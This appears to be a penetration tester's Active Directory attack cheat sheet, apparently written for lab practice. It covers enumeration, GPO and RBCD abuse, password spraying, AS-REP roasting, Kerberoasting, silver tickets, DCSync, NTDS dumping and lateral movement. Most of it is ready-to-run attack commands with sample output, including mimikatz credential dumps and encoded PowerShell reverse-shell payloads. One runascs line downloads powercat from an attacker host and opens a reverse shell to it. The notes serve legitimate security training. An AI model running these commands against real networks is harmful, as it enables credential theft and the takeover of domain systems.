---
title: Active Directory
---
# Manual Enumeration
## net.exe
- To get the current account policy, we can run `net accounts` - this will provide us with information such as the lockout policy
- We can use `net.exe` to not only list local users and groups, but also domain ones by passing the `/domain` parameter
```powershell
net user /domain
net group /domain
```
- We can get more infos on individual users or groups (such as memberships) by providing the username
```powershell
net user alexa /domain
net group "Group Name" /domain
```
>[!WARNING]
>`net group "Group Name" /domain` will only show user accounts as members. If we have a group object as part of the members this will get missed. In addition, `net.exe` can not display specific attributes.

## setspn.exe
- We can check for SPNs to see which services are linked to accounts using `setspn -L <username>`

## rpcclient
- If we have port 135 open we can try to connect with `rpclient`
```zsh
#Perform a null bind
rpcclient -U '' -N 192.168.216.175

#With credentials
rpcclient -U 'alexa' --password 'ThisIsSecret!' 192.168.216.175
```
- A list of handy commands such as `enumdomusers`, `querydominfo` or `getdompwinfo` is available [here](https://www.hackingarticles.in/active-directory-enumeration-rpcclient/)
- If we have a user with enough privileged, we might be able to change a users password with `setuserinfo`
```zsh
setuserinfo Alexa 23 'Init_12345'
```

## Powershell and .NET
- To get infos about the current domain and enumerate the current PDC (Primary Domain Controller), we can use the `GetCurrentDomain()` method
```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```
- To get the LDAP path of the current domain, we can use the following script
```powershell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```
- The above can also be extended to create a simple script to enumerate all users and get their properties
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}
```
> [!HINT]
> The [samAccountType](https://learn.microsoft.com/en-us/windows/win32/adschema/a-samaccounttype) can be one of the following values. Convert to decimal to use in the script
> - SAM_DOMAIN_OBJECT 0x0
> - SAM_GROUP_OBJECT 0x10000000
> - SAM_NON_SECURITY_GROUP_OBJECT 0x10000001
> - SAM_ALIAS_OBJECT 0x20000000
> - SAM_NON_SECURITY_ALIAS_OBJECT 0x20000001
> - SAM_USER_OBJECT 0x30000000
> - SAM_NORMAL_USER_ACCOUNT 0x30000000
> - SAM_MACHINE_ACCOUNT 0x30000001
> - SAM_TRUST_ACCOUNT 0x30000002
> - SAM_APP_BASIC_GROUP 0x40000000
> - SAM_APP_QUERY_GROUP 0x40000001
> - SAM_ACCOUNT_TYPE_MAX 0x7fffffff
- The above script can be adjusted to only show information on specific users by adding `$dirsearcher.filter="name=alexa"` 

## NXC
### LDAP
- We can check for anonymous bind on LDAP to get users description with `nxc`
```zsh
nxc ldap 192.168.237.122 -d 'corp.local' -u '' -p ''  -M get-desc-users
```

## Powerview
- We can load PowerView with `Import-Module .\PowerView.ps1`. PowerView can provides us with a lot of information about the current domain
### Users
- Get information about the current domain - `Get-NetDomain`
- Get a list of all users and their attributes - `Get-NetUser`
- Get a list of usernames - `Get-NetUser | select cn`
- Get a list of all user, their last password reset as well as the last logon time - `Get-NetUser | select cn,pwdlastset,lastlogon` 
- Check if the current users is a local admin on any domain computer - `Find-LocalAdminAccess`. This also supports adding separate credentials or specifying a computername to check
- Get logged on users on other systems - `Get-NetSession -ComputerName files04 -Verbose`
> [!WARNING]
> This will most likely not work on newer Windows versions due to access restrictions. Always add the `-Verbose` flag to get the information if we do not have access. Otherwise there will just be no output and we might assume there are no logged in users. An alternative is running `psloggedon.exe` which needs remote registry service to be enabled which is not by default since Windows 8. We can specify the computer to query with `.\PsLoggedon.exe \\files04`
### Groups
- Get a list of all groups and their attributes - `Get-NetGroup`
- Get the group names - `Get-NetGroup | select cn`
- Get the members of a specific group - `Get-NetGroup "Group Name" | select member`
### Computers
- Get all computer objects - `Get-NetComputer`
- Get operating system and DNS name of all computer objects - `Get-NetComputer | select operatingsystem,dnshostname`

### Service Principal Names (SPN)
- Get a list of all SPNs - `Get-NetUser -SPN | select samaccountname,serviceprincipalname`

### Object Permissions
> [!HINT]
> The most important permission types are
>  ``` 
>  GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group 
- To get ACEs (Access Control Entries) we can use `Get-ObjectAcl` - For a specific user we can use `Get-ObjectAcl -Identity stephanie`
- We are primarily interested in _ActiveDirectoryRights_ and _SecurityIdentifier_ which will show us who has which privileges over the object
- The output will contain SIDs. We can use `Convert-SidToName` to make it more readable
```powershell
PS C:\Tools> Get-ObjectAcl -Identity stephanie

...
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
ActiveDirectoryRights  : ReadProperty
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 4c164200-20c0-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 16
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
AceType                : AccessAllowedObject
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None
...

PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie
```
- We can get a list of all SIDs that have the GenericAll permission over a specific object with `Get-ObjectAcl` as well
```powershell
Get-ObjectAcl -Identity "Group Name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

### Domain Shares
- We can get a list of shares using `Find-DomainShare` - if we supply the `-CheckShareAccess` parameter it will only list shares available to our current user
> [!HINT] 
> Always check the **SYSVOL** share on a domain controller. It may include files and folders that reside on the domain controller itself. This share is accessible to every domain user.

# Automated Enumeration
## Bloodhound
- We can collect data from a domain joined windows host using `SharpHound.ps1`
```powershell
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethods All -OutputDirectory C:\Users\alexa\Desktop\ -OutputPrefix "corp.local audit"
```
> [!HINT]
> While the above will collect a snapshot of the current information available, SharpHound also supports looping. This will continuously scan and gather additional data as the environment changes (i.e a new users loggs in). We can get more information on needed parameters to set this up using `Get-Help Invoke-BloodHound`
- From a linux host, we can use `bloodhound-python` if we have credentials
```zsh
bloodhound-python -d corp.local -u 'alexa' -p 'Password123!' -dc dc01.corp.local -ns 192.168.223.122 --collectionmethod all --zip
```
### Custom Queries
- We can craft our own queries and run them via the _Raw Query_ functions
```bloodhound
#Display all computers
MATCH (m:Computer) RETURN m

#Display all users
MATCH (m:User) RETURN m

#Display active sessions
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p

#Display users with CanPSRemote (WinRM Access)
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

#Display users with SQLAdmin rights
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

#Display users with CanRDP (RDP Access)
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanRDP*1..]->(c:Computer) RETURN p2
```

## Snaffler
- We can use [Snaffler](https://github.com/SnaffCon/Snaffler) on a domain-joined host or in a domain-user contect to enumerate hosts inside a domain for shares and readable directories and automatically hunt for files that might contain sensitive information
```powershell
./Snaffler.exe -s -d domain.local -o snaffler.log -v data
```

# Abusing Permissions
## GPO
- We can display the current GPOs using `Get-DomainGPO` from `powerview.ps1`. To then display only a specific GPO we can use `-identity`
```zsh
Get-DomainGPO
Get-DomainGPO | select displayname
Get-DomainGPO -Identity "Default Domain Controllers Policy"
```
- Bloodhound should show us if we have control over a GPO on the outbound control attribute. To check manually, we can use `Get-DomainGPO` in combination with `Get-ObjectAcl`
```powershell
#Get the SID of a group or user
$sid=Convert-NameToSid "Domain Users"

#Check permissions on GPOs
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

#Convert the found GPOs back to a readable name (The CN field will be the GUID of the GPO). 
Get-GPO -Guid <GUID>
```
- If we have edit rights on a GPO we can use `SharpGPOAbuse.exe` from [FSecureLabs](https://github.com/FSecureLABS/SharpGPOAbuse) (Precompiled version in `/usr/share/windows-resources/binaries`)
```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"
```
- Perform a `gpupdate` afterwards, check with `net localgroup administrator` and re-authenticate 

## RBCD attack
- Resource-Based Constrained Delegation attack can be used to escalate privileges if we have `GenericAll` permissions on a computer object. 
- From Windows, we can use a combination of [Powermad](https://github.com/Kevin-Robertson/Powermad) , `PowerView.ps1` and `Rubeus.exe` to achieve this
```powershell
#Import Powermad and create a new machine account
import-module .\Powermad.ps1
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

#Retrieve the SID of the new machine account with PowerView
import-module .\Powerview.ps1
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid

#Build generic ACE with our machine account as principal
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

#Using PowerView we add our machine account to msDS-AllowedToActOnBehalfOfOtherIdentity of the target computer
Get-DomainComputer DC01.corp.local | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#We then use Rubeus.exe to hash our previously chosen password
Rubeus.exe hash /password:Summer2018!

#Then use Rubeus s4u module to get a service ticket and inject it with /ptt
Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/DC01.corp.local /ptt
```
- From Linux, we can employ `impacket` and `rpcd.py` found on [tothi Github](https://github.com/tothi/rbcd-attack/)
```zsh
#Add computer account
impacket-addcomputer corp.local/alexa -dc-ip 192.168.167.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'Summer2018!'

#Add computer account to msDS-AllowedToActOnBehalfOfOtherIdentity
py /usr/share/linux-resources/rbcd-attack/rbcd.py -dc-ip 192.168.167.175 -t DC01 -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 corp.local\\alexa

#Get service ticket, this will get saved on disk
impacket-getST -spn cifs/DC01.corp.local resourced/attack\$:'Summer2018!' -impersonate Administrator -dc-ip 192.168.167.175

#Set ticket accordingly
export KRB5CCNAME=./Administrator.ccache

#Add IP of our target to hosts file
addhost 192.168.167.175 dc01.corp.local
#Use impacket-psexec to get a shell on the target
sudo impacket-psexec -k -no-pass DC01.corp.local -dc-ip 192.168.167.175
```

## LAPS
- If we have a user that has the ability to read LAPS passwords, we can use [pyLAPS](https://github.com/p0dalirius/pyLAPS) from our linux hosts to read them
```zsh
py pyLAPS.py --action get -d "corp.local" -u "alexa" -p "init12345" --dc-ip 192.168.223.122
```
- From a Windows host, follow the bloodhound instructions

# Abusing AD Authentication
## Password Spraying
- We can use `Spray-Passwords.ps1` to spray passwords. This script will automatically detect all domain users and spray passwords against them
```powershell
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin

.\Spray-Passwords.ps1 -File passwords.txt -Admin
```
- We can also use `nxc` for password spraying against SMB
```zsh
nxc smb administrator.htb -u users -p passwords -d corp.com --continue-on-success
```
- Lastly we can use `kerbrute` to password spray against Kerberos
```powershell
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
> [!WARNING]
> When using `kerbrute` on Windows instead of Linux make sure that the encoding of **usernames.txt** is _ANSI_. Use Notepad's _Save As_ functionality to change the encoding.
## Kerberos
### Extracting Tickets
- We can use `mimikatz` to list tickets with `sekurlsa::tickets`

### AS-REP Roasting
- If a user account does not have _Kerberos preauthentication_ enabled, we can perform AS-REP Roasting
- To identify users that do not have this option set, we can use `PowerView.ps1` function `Get-DomainUser -PreauthNotRequired` or `impacket-GetNPUsers` withouth the `-request` and `-outputfile` parameter
```zsh
impacket-GetNPUsers -usersfile users.txt -dc-ip 192.168.50.70 'corp.com/'

impacket-GetNPUsers -dc-ip 192.168.210.70 'corp.com/jeff:HenchmanPutridBonbon11'
```
- Using `impacket-GetNPUsers` with the `-request` will give us a list of users that do not have this enabled along with the AS-REP hash for those users
```zsh
#Users queried via LDAP anonymous bind
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -format hashcat -outputfile hashes.asreproast 'corp.com/'

#Users queried via LDAP anonymous bind
impacket-GetNPUsers -dc-ip 192.168.50.70 -usersfile users.txt -request -format hashcat -outputfile hashes.asreproast 'corp.com/'

#Users queried via LDAP bind with creds
impacket-GetNPUsers -request -format hashcat -outputfile hashes.asreproast -dc-ip 192.168.50.70 'corp.com/pete:Nexus123'

#User queried via LDAP bind with NT Auth
impacket-GetNPUsers -request -format hashcat -outputfile hashes.asreproast -hashes 'LMhash:NThash' -dc-ip 192.168.50.70 'corp.com/pete'

#With a users file
impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile hashes.asreproast -dc-ip 192.168.50.70 'corp.com/'
```
- We can also perform this on a domain hosts using `Rubeus.exe`
```powershell
.\Rubeus.exe asreproast /nowrap
```
- After obtaining the hashes, we can crack them using `hashcat`
```zsh
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Kerberoasting
- We can try to bruteforce a service account password by requesting a service ticket (TGS-REP). Since the service ticket is encrypted using the SPNs password hash, we can try to bruteforce this and get the password of the service account
- We can use `impacket-GetUserSPN` to get TGS-REP hashes
```zsh
impacket-GetUserSPNs -dc-ip 192.168.50.70 -request -outputfile hashes.kerberoast 'corp.com/pete:Nexus123'
```
> [!HINT]
> If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller.
> `sudo timedatectl set-ntp off`
> `sudo rdate -n corp.com`

- We can also perform this on a domain host using `Rubeus.exe`
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
- After obtaining the hashes, we can crack them using `hashcat`
```zsh
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Silver Tickets
- If we have the password or the associated NTLM hash of a service account we can forge our own service tickets with modified content such as the users group memberships. The following information needs to be available to us
	- SPN password hash
	- Domain SID
	- Target SPN
>[!HINT]
>If we only have the password, we can use this [NTLM Hash generator](https://codebeautify.org/ntlm-hash-generator) to create the NTLM hash from the password
- We can check for available NTLM hashes of service accounts using `mimikatz` 
```zsh
privilege::debug
sekurlsa::logonpasswords

Authentication Id : 0 ; 1147751 (00000000:00118367)
Session           : Service from 0
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 4:52:14 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09
         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
```
- In order to get Domain SID we can run `whoami /user` and remove the last part of the SID which specifies the user
```powershell
whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
corp\alexa S-1-5-21-1987370270-658905905-1781884369-1108
```
- To get the target SPN we can check with `setspn -L <username>`
- After we have all needed information, we can use the module `kerberos:golden` from `mimikatz` 
```powershell
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```
> [!WARNING] 
> Do not use `token::elevate` as the injection to memory for the current session will not work properly (as we will be NTAUTHORITY\SYSTEM)
- The `/ptt` option allows us to inject the forged ticket into the memory of the machine we execute the command on
- The `/user` will be the user set in the forged ticket
- The `/rc4` option is the NTLM hash of the SPN/Service Account
> [!Hint]
> After crafting the ticket, we can use the powershell command `klist` to check if it is ready to use in memory
- We can also use `impacket-ticketer` to create a silver ticket
```zsh
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain corp.com -spn MSSQL/sql_srv1.corp.com -user-id 500 Administrator
```
- We can then use `impacket-psexec` to try and get a shell
```zsh
impacket-psexec -k -no-pass dc01.corp.com -dc-ip 192.168.231.11
```
### Domain Controller Synchronization
- If we have a user with _Replicating Directory Changes_, _Replicating Directory Changes All_, and _Replicating Directory Changes in Filtered Set_ rights we can launch a DC replication and perform a dcsync attack. 
- For this we can use `mimikatz` or `impacket-secretsdump`
```powershell
lsadump::dcsync /user:corp\Administrator
```
```zsh
impacket-secretsdump -just-dc-user Administrator corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

## Active Directory Certificate Services
### Exporting Private Keys
- Most often, we can not simply export private keys from certificate stores. Hoever, we can try to make them exportable by patching the CryptoAPI using `mimikatz`by using `crypto::capi` 
- Another way could be to to patch the KeyIso service with `mimikatz` using `crypto::cng`

## NTDS
- As descriped on [thehacker.recipes](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds) we can use the file `NTDS.dit` to extract hashes for users, groups, security descriptors and passwords
- If we find (or are able to extract) this, we can parse it and dump secrets using `impacket-secretsdump`
- We can also use [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) to dump more than just secrets (users, groups, OUs etc.)
```zsh
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```

# Lateral Movement In Active Directory
## WMI and WinRM
- If we have RPC port 135 open on a remote host, we can use WMI to create a process on the remote host
```cmd
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```
```powershell
$username = 'alexa';
$password = 'P@ssw0rd!';

$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;

$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 

$command = 'calc';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
- The above command `calc` should then be replaced by a payload of our chosing (i.e a Powershell reverse shell)
```powershell
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
```
- Another way can be to use WinRM which is listening on ports 5986 (TLS) and 5985
- For WinRM to work properly, the user needs to be part of the "Remote Management Users" group
- We can use `winrs` or `evil-winrm` to execute commands (again, replace the command with an appropriate payload)
```cmd
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
```
- If we have access to WinRM and have credentials for another user which is not in the _Remote Management Group_, we can use `runascs.exe` to send ourselves a reverse shell
```powershell
.\runascs administrator Password123 --logon-type 8 "powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.232:8000/powercat.ps1');powercat -c 192.168.45.232 -p 443 -e powershell"
```
- With `powershell` we can use the WinRM built-in capability _PowerShell remoting_ which can be invoked with `New-PSSession`
```powershell
$username = 'alexa';
$password = 'P@ssw0rd!';

$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;

$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
```
- After creating a session, we can use `Enter-PSSession` followed by the session ID to interact with it
```powershell
Enter-PSSession 1
```

## PsExec
- We can use `PsExec.exe` to run remote commands if:
	- The user needs to be part of the local Administrators group on the target
	- The ADMIN$ share must be available
	- File and Printer Sharing has to be turned on
```powershell
.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```

## Pass The Hash
- If servers or services use NTLM authentication, we can use a users NTLM hash to authenticate instead of the password
- Similar to PsExec, there are prerequisites that have to be met
	- SMB connection has to be open
	- File and Printer Sharing has to be enabled
	- The ADMIN$ share needs to available
	- User has to be in the local Administrators group on the target
- We can use `impacket-wmiexec` or `nxc` to get code execution
```zsh
ipacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

##  Overpass The Hash
- With overpass the hash we can use NTLM hashes to get Kerberos Ticket Granting Ticket (TGT) which we can then use to get a Ticket Granting Service (TGS)
- We can use `mimikatz` to turn a NTLM hash into a Kerberos Ticket Granting Ticket using `sekurlsa::pth`
```powershell
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```
- In the resulting `powershell` session, we could now for example use `net use \\fileshare` to get a TGS or use other tools such as `PsExec.exe` that rely on Kerberos authentication (Since we now have a TGT that was converted from our NTLM Hash)
```powershell
net use \\fileshare
klist
.\PsExec.exe \\fileshare cmd
```

## Pass The Ticket
- While we can only use a TGT on the machine it was created for, we can export and use a TGS from elsewhere on the network to authenticate against a service
- We can use `mimikatz` to export existing TGT/TGS tickets with `sekurlsa::tickets /export`. This will export found tickets to individual `*.kirbi` files in the directory that `mimikatz` was run from
```powershell
mimikatz #privilege::debug
Privilege '20' OK

mimikatz #sekurlsa::tickets /export
```
- We can then use the appropriate ticket and inject it using `kerberos:ptt` from `mimikatz`
> [!WARNING]
> As with `kerberos::golden` do not use `token::elevate` as the ticket would get injection to the NTAUTHORITY\SYSTEM session
```powershell
PS C:\Tools> dir *.kirbi


    Directory: C:\Tools


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

==================MIMIKATZ AFTER===================

kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
- After that, we can verify with `klist` if the ticket has been injected properly

## DCOM
- DCOM is performed over RPC on TCP port 135 and local administrator access is required
- We can use an elevated `powershell` prompt to instantiate a remote MMC 2.0 application
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAa...AcKA==","7")
```
